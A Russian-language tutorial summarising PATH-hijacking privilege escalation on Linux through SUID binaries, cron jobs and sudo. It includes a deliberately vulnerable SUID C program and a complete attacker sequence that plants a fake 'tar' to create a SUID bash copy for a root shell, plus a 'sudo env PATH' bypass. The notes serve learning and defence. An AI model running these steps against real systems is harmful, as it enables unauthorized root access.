# 🔥 Полный конспект по эксплуатации PATH

## 📌 **Что такое PATH и как она работает**

**PATH** — это переменная окружения, которая указывает системе, в каких папках искать исполняемые файлы, когда ты вводишь команду без полного пути.

**Пример PATH:**
```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Когда ты вводишь `sleep 2`, система ищет `sleep` в папках по порядку:
1. `/usr/local/sbin/sleep`
2. `/usr/local/bin/sleep`
3. `/usr/sbin/sleep`
4. `/usr/bin/sleep` ← обычно здесь
5. `/sbin/sleep`
6. `/bin/sleep`


## 🧠 **КЛЮЧЕВОЙ МОМЕНТ: PATH — НЕ ГЛОБАЛЬНАЯ!**

**PATH — это переменная окружения каждого процесса.**  
Если ты изменишь PATH в своей сессии (`export PATH=/tmp:$PATH`), это повлияет **ТОЛЬКО на твой текущий shell** и на процессы, которые ты запускаешь из него.

**Другие пользователи, cron, systemd, sudo — используют СВОЙ PATH.**


## 🔥 **Три сценария эксплуатации PATH**

### Сценарий А: **Ты САМ запускаешь программу (работает)**

Ты можешь изменить `PATH` в своей сессии и запустить программу вручную.

**Условия:**
- Программа имеет SUID-бит (выполняется от root).
- Программа вызывает команду без полного пути.
- Ты можешь писать в папку, которая идёт раньше в `PATH`.

**Пример:**
```bash
export PATH=/tmp:$PATH
/usr/local/bin/backup_system
```


### Сценарий Б: **Программа запускается по CRON (не работает без редактирования)**

Cron использует **свой** `PATH`. Твой изменённый `PATH` не влияет на cron.

**Чтобы сработало:**
1. Редактируешь cron-задачу:
   ```bash
   PATH=/tmp:/usr/local/bin:/usr/bin
   * * * * * /opt/backup.sh
   ```
2. Или редактируешь сам скрипт:
   ```bash
   #!/bin/bash
   export PATH=/tmp:$PATH
   tar -czf /tmp/backup.tar.gz /home
   ```


### Сценарий В: **Программа запускается через sudo (не работает, если secure_path)**

`sudo` использует `secure_path`, игнорируя твой `PATH`.

**Чтобы сработало:**
1. Передать `PATH` через `sudo env` (если разрешено):
   ```bash
   sudo -u ops_user env PATH=/tmp:$PATH /usr/local/bin/deploy.sh
   ```
2. Редактировать сам скрипт (если есть права):
   ```bash
   #!/bin/bash
   export PATH=/tmp:$PATH
   ./deploy_helper.sh
   ```


## 🧩 **Пример 1: SUID-программа (Ты запускаешь вручную)**

### 1. Исходный код программы (`backup_system.c`)
```c
#include <stdlib.h>
int main() {
    setuid(0);
    system("tar -czf /tmp/backup.tar.gz /home");
    return 0;
}
```

### 2. Компиляция и установка SUID
```bash
gcc backup_system.c -o backup_system
sudo chown root:root backup_system
sudo chmod u+s backup_system
```

**Результат:**
```bash
-rwsr-xr-x 1 root root 16784 /usr/local/bin/backup_system
```

### 3. Действия атакующего
```bash
# Найти SUID-программу
find / -perm -4000 -type f 2>/dev/null

# Создать поддельный tar в /tmp
cd /tmp
echo '#!/bin/bash' > tar
echo 'cp /bin/bash /tmp/rootme' >> tar
echo 'chmod 4755 /tmp/rootme' >> tar
chmod +x tar

# Изменить PATH
export PATH=/tmp:$PATH

# Запустить SUID-программу
/usr/local/bin/backup_system

# Стать root
/tmp/rootme -p
```


## 🧩 **Пример 2: Cron-задача (Нужно редактировать)**

### Ситуация:
```bash
* * * * * /opt/backup.sh
```

Внутри `/opt/backup.sh`:
```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home
```

### Если ты НЕ можешь редактировать cron:
- Просто изменить `PATH` в своей сессии **НЕ сработает**.

### Если ты МОЖЕШЬ редактировать cron:
```bash
crontab -e
```
Добавить:
```bash
PATH=/tmp:/usr/local/bin:/usr/bin:/bin
* * * * * /opt/backup.sh
```

### Если ты МОЖЕШЬ редактировать скрипт:
```bash
#!/bin/bash
export PATH=/tmp:$PATH
tar -czf /tmp/backup.tar.gz /home
```


## 🧩 **Пример 3: sudo (Нужно передать PATH)**

### Ситуация:
```bash
sudo -l
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Внутри `deploy.sh`:
```bash
#!/bin/bash
sleep 2

```

### Если просто изменить PATH в своей сессии:
**НЕ сработает**, потому что `sudo` использует `secure_path`.

### Как исправить:
```bash
sudo -u ops_user env PATH=/tmp:$PATH /usr/local/bin/deploy.sh
```


## 📌 **Условия успешной атаки (все должны быть выполнены)**

| Условие | Объяснение |
| :--- | :--- |
| ✅ Команда без полного пути | Программа вызывает `tar`, а не `/usr/bin/tar` |
| ✅ Возможность изменить `PATH` в контексте выполнения | Ты сам запускаешь, или редактируешь cron/скрипт |
| ✅ Права на запись в папку, которая идёт раньше в `PATH` | Например, `/tmp` или `/usr/local/bin` |
| ✅ Программа выполняется от привилегированного пользователя | root, `ops_user`, `monitor_user` |

---

## 🧠 **Что такое SUID-бит (кратко)**

**SUID (Set User ID)** — бит, который заставляет программу выполняться от имени владельца файла, а не от пользователя, который её запустил.

**Пример:**
```bash
-rwsr-xr-x 1 root root 16784 /usr/local/bin/backup_system
```
- Буква `s` в поле владельца → программа выполняется от `root`.
- Любой пользователь, запустивший её, получает права `root` на время выполнения.


## 🚀 **Коротко для запоминания**

| Сценарий | Работает? | Как исправить |
| :--- | :--- | :--- |
| Ты запускаешь SUID-программу | ✅ Да | `export PATH=/tmp:$PATH` |
| Cron-задача | ❌ Нет | Редактировать cron или скрипт |
| sudo с secure_path | ❌ Нет | `sudo env PATH=...` или редактировать скрипт |


**Главный вывод:**  
Ты можешь подменить команду через `PATH` **только если ты можешь влиять на `PATH` в контексте выполнения программы**. Если программа запускается другим пользователем (cron, sudo), просто изменить `PATH` в своей сессии недостаточно — нужно менять конфигурацию или сам скрипт. 🚀